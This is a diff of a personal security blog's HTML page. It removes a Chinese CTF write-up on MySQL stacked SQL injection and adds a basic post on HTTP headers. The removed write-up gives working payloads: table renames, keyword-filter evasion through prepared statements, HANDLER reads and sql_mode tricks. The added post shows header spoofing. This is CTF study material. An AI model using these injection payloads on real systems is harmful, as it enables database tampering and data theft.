@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="buu 堆叠注入, web security">
+    <meta name="keywords" content="http协议基础, web security">
     <meta name="description" content="技术安身立命，思想改变世界">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>buu 堆叠注入 | K1@ing</title>
+    <title>http协议基础 | K1@ing</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">buu 堆叠注入</h1>
+                    <h1 class="description center-align post-title">http协议基础</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">sql注入</span>
+                            <a href="/tags/http%E5%8D%8F%E8%AE%AE/">
+                                <span class="chip bg-color">http协议</span>
                             </a>
                         
                     </div>
@@ -443,8 +443,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
-                                sql注入
+                            <a href="/categories/http%E5%8D%8F%E8%AE%AE/" class="post-category">
+                                http协议
                             </a>
                         
                     </div>
@@ -456,28 +456,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-01-20
+                    2021-01-22
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-01-21
+                    2021-01-22
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    947
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    3 分
                 </div>
                 
 
@@ -497,74 +497,39 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>做buu之前对于堆叠的了解并不多，可以说几乎没有，做了几道题目之后才慢慢开始了解到了堆叠注入的基本原理和解题思路，并且堆叠在强网杯考了一道题，可以说这个类型的漏洞足够经典，于是大致上总结了一下。</p>
-<h3 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h3><p>堆叠注入的基本原理是在sql中， <strong>；</strong>一直被用来代表sql语句执行的结束，而如果后端代码允许在；后插入新的多条sql语句，使这些sql一起执行，就构成了堆叠注入。</p>
-<p>需要注意的是，堆叠注入与union联合查询并不相同，union后面接的只能是select语句，即只能进行查询功能，而堆叠则可以执行任意sql语句。</p>
-<h3 id="buu-web-2-随便注-强网杯2019"><a href="#buu-web-2-随便注-强网杯2019" class="headerlink" title="buu web 2 随便注 [强网杯2019]"></a>buu web 2 随便注 [强网杯2019]</h3><p>flag{72889698-fd20-41d7-a081-e7321af36e19}</p>
-<p>核心源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;multi_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">//multi函数可以执行多条，造成了堆叠注入</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];<span class="comment">//查询语句</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>拿到题目之后感觉是sql，首先进行闭合，发现找不到注入点。尝试一下堆叠注入</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure>
-
-<p>发现有回显，此时查看每个数据库的表</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> everydatabase;<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure>
-
-<p>在supersqli数据库中发现两个表</p>
-<p>1919810931114514</p>
-<p>words</p>
-<p>看一下字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> table_name;</span><br></pre></td></tr></table></figure>
-
-<p>在一串数字的表里发现了flag字段，尝试看一下</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>
-
-<p>注意数字名加反引号，果然，发现了关键词过滤</p>
-<p>观察一下，输入框内输入一个数据，回显另一个，也就是说被用来回显的表应该是两个字段，而我们观察一下words表，恰好两个字段，会不会就是使用的words表呢?</p>
-<p>如果是这样的话，猜测后端的sql语句为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> XXXX <span class="keyword">from</span> words <span class="keyword">where</span> <span class="keyword">id</span>=$_GET[inject];</span><br></pre></td></tr></table></figure>
-
-<p>比较巧的一种方法是重命名，即将words改为其他名并将数字表改名为words，将flag字段改名为id直接在输入框提交即可</p>
-<p>payload:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>此时在输入框输入 1’ or 1=1 # 得到flag值</p>
-<h4 id="进阶方法"><a href="#进阶方法" class="headerlink" title="进阶方法"></a>进阶方法</h4><p>看了dl们的解法有两种比较新颖，</p>
-<p>1.预处理</p>
-<p>预处理原理：对于每条sql语句进行反复调用时，若反复进行编译效率太低，因此推行了预处理，即先将sql语句中的值用占位符处理，相当于将sql语句模板化</p>
+                <h1 id="http协议基础"><a href="#http协议基础" class="headerlink" title="http协议基础"></a>http协议基础</h1><p>做了一个http的很基础的题目，就着说点基础知识。</p>
+<h2 id="buu-web-15-http-极客大挑战2019"><a href="#buu-web-15-http-极客大挑战2019" class="headerlink" title="buu web 15 http [极客大挑战2019]"></a>buu web 15 http [极客大挑战2019]</h2><p>flag{cdbbcfe5-b591-44a6-9035-e72a87c813b8}</p>
+<p>很基本的http请求的题目，首先看下源码，页面提示了secret.php，跳转到该页面后提示不是来自<a target="_blank" rel="noopener" href="http://www.sycsecret.com,所以burp抓下包,加referer,发送请求后在burp看到回应是只能使用syclover浏览器,也就是说得加上ua,再发包,回应是只能从本地访问,再加x-forwarded-for,即可得到flag/">www.Sycsecret.com，所以burp抓下包，加referer，发送请求后在burp看到回应是只能使用syclover浏览器，也就是说得加上UA，再发包，回应是只能从本地访问，再加x-forwarded-for，即可得到flag</a></p>
 <p>payload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">Set</span> @a = <span class="keyword">CONCAT</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect * from `1919810931114514`;&#x27;</span>);</span><br><span class="line"><span class="keyword">prepare</span> m <span class="keyword">from</span> @a;//定义预处理语句</span><br><span class="line"><span class="keyword">Execute</span> m;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: https://www.Sycsecret.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Syclover browser</span><br><span class="line"><span class="attribute">X-Forward-For</span>: 127.0.0.1</span><br></pre></td></tr></table></figure>
 
-<p>2.handler</p>
-<p>handler是一种mysql自带的，非标准的sql语法。性能高但是少见</p>
-<p>基本语法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> table_name <span class="keyword">open</span>//打开一张表</span><br><span class="line"><span class="keyword">handler</span> table_name <span class="keyword">read</span> <span class="keyword">first</span>(<span class="keyword">next</span>)//阅读指定的行</span><br><span class="line"><span class="keyword">handler</span> <span class="keyword">close</span>//关闭</span><br></pre></td></tr></table></figure>
+<h2 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h2><p>http，今天所有的web程序使用的通信协议，其基于一种简单的模型：客户端发送一条请求，服务器返回一条响应。</p>
+<h3 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h3><p>先来看一个经典的http请求</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/auth/488/yourdetails.ashx?uid=129</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: application/x-ms-application, image/jpeg, image/gif, */*</span><br><span class="line"><span class="attribute">Referer</span>: https:mdsec.net/auth/488/Home.ashx</span><br><span class="line"><span class="attribute">Accept-language</span>: en-GB</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/4.0 (balabalabala)</span><br><span class="line"><span class="attribute">Host</span>: mdsec.net</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Active</span><br><span class="line"><span class="attribute">Cookie</span>: sessionID=balabalabala</span><br></pre></td></tr></table></figure>
 
-<p>因为flag就在第一行，所以payload比较简单</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> u;</span><br><span class="line"><span class="keyword">handler</span> u <span class="keyword">read</span> <span class="keyword">first</span>;</span><br><span class="line"><span class="keyword">handler</span> u <span class="keyword">close</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>常用的几个点</p>
+<h4 id="第一行"><a href="#第一行" class="headerlink" title="第一行"></a>第一行</h4><p>由三个以空格为间隔的项目组成</p>
+<p>第一个说明了http方法，第二个是请求的url，第三个是http版本</p>
+<h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>表示发出请求的原始url。</p>
+<p>例如上题中提示要从secret.com发出，就是要求添加referer</p>
+<h4 id="UA"><a href="#UA" class="headerlink" title="UA"></a>UA</h4><p>user-agent提供浏览器或者其他客户端软件的信息，并且大多数都包含mozilla前缀。</p>
+<p>例如上题要求使用特定的浏览器进行访问，即添加ua</p>
+<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>提交服务器向客户端发布的其他参数，多用于验证身份。</p>
+<h3 id="http响应"><a href="#http响应" class="headerlink" title="http响应"></a>http响应</h3><p>当客户端向服务器提交请求之后，服务器会反馈一个响应，还是来看响应的格式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Tue, 20 Apr 2012 08:23:23 GMT</span><br><span class="line"><span class="attribute">Server</span>: Microsoft-IIS/6.0</span><br><span class="line"><span class="attribute">X-Powered-By</span>: ASP.NET</span><br><span class="line"><span class="attribute">Set-Cookie</span>: tracking=balabalabala</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 1067</span><br><span class="line"></span><br><span class="line"><span class="attribute">balabalbala......</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="buu-web-5-easysql-suctf-2019"><a href="#buu-web-5-easysql-suctf-2019" class="headerlink" title="buu web 5 easysql [suctf 2019]"></a>buu web 5 easysql [suctf 2019]</h3><p>flag{230b58e2-6c67-4bad-98b0-5e84cccfa11c}</p>
-<h4 id="一般思路-1"><a href="#一般思路-1" class="headerlink" title="一般思路"></a>一般思路</h4><p>本题第一次见十分让我费解，因为输入各种payload只有1有回显1，其他均无一头雾水。</p>
-<p>后来才知道这种情况下，基本上是&amp;&amp;或者||，即逻辑与和逻辑或，比如本题，即为或操作，猜测其sql语句为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>
-
-<p>flag是一个字符串，||操作很难使得其为真并回显，所以测试常规payload只有1有回显1，因为只有此时查询内容为真。</p>
-<p>思路主要是处理||符号，即将其转化。</p>
-<p>使用sql_mode，该函数定义了mysql支持的sql语法，其中PIPES_AS_CONCAT会将||视为字符串连接符。</p>
-<p>payload</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="进阶方法-1"><a href="#进阶方法-1" class="headerlink" title="进阶方法"></a>进阶方法</h4><p>思路同样是处理||，但是dl们搞出来一个非预期解</p>
-<p>*,1</p>
-<p>此时的sql语句拼接为</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
-
-<p>1||flag恒为1，sql语句相当于</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span> <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
-
-<p>因此会查出表中所有内容，自然就查到了flag</p>
+<h4 id="第一行-1"><a href="#第一行-1" class="headerlink" title="第一行"></a>第一行</h4><p>也是以空格为间隔的三个项目，第一个是http版本，第二个是请求结果的状态码，第三个是响应状态</p>
+<h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><p>指明服务器软件。</p>
+<h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><p>是服务器向客户端发送的另一个cookie，将在随后客户端向服务器发送的请求中被写入请求头对应的cookie位置。</p>
+<p>可以看到这也是cookie容易被攻击者利用的一个原因，只要在流量中截获一次通信，就有可能获得身份验证</p>
+<h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><p>几乎所有的http响应，在消息头的空白行后都包含消息主体，contnet-type说明了主体的格式</p>
+<p>例如上面这个消息主体包含一个html文档</p>
+<h2 id="http方法"><a href="#http方法" class="headerlink" title="http方法"></a>http方法</h2><p>最常用的两种，get，post但是二者有区别</p>
+<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>get方法的作用是获取资源，使得url以查询字符串的形式向请求的资源发送参数以获取该参数对应的资源。</p>
+<p>说白了，get就是可以在浏览器输入框修改的内容，要么修改地址，要么修改参数，二者都对应不同的路径，而不同的路径则对应着不同的资源。</p>
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>post请求一般都包含消息主体，与get不同的是，post方式不在url中提交参数，其主要作用是执行操作。post提交的参数需要在消息主体中修改或说明</p>
+<p>例子不是很好举，做文件上传类型题目的时候如果注意抓包看一下的话就大概清楚了，很多都是post方式，并且修改消息主体中的文件格式是很常见的一种欺骗后端的方法</p>
+<h2 id="end"><a href="#end" class="headerlink" title="end"></a>end</h2><p>时间关系，今天说的很少，关于更加详细的消息头，状态码，https等等，以后有机会再说</p>
 
                 
             </div>
@@ -591,7 +556,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://K1ingzzz.github.io/2021/01/20/buu-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">http://K1ingzzz.github.io/2021/01/20/buu-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</a>
+                    <a href="http://K1ingzzz.github.io/2021/01/22/http%E5%8D%8F%E8%AE%AE/">http://K1ingzzz.github.io/2021/01/22/http%E5%8D%8F%E8%AE%AE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -629,8 +594,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">sql注入</span>
+                                <a href="/tags/http%E5%8D%8F%E8%AE%AE/">
+                                    <span class="chip bg-color">http协议</span>
                                 </a>
                             
                         </div>
@@ -674,9 +639,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/01/22/http%E5%8D%8F%E8%AE%AE/">
                     <div class="card-image">
@@ -694,9 +660,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -709,6 +675,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -727,13 +694,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/10/hello-world/">
+                <a href="/2021/01/20/buu-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="buu 堆叠注入">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">buu 堆叠注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -744,15 +711,27 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-20
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            K1@ing
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/sql%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    sql注入
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">sql注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
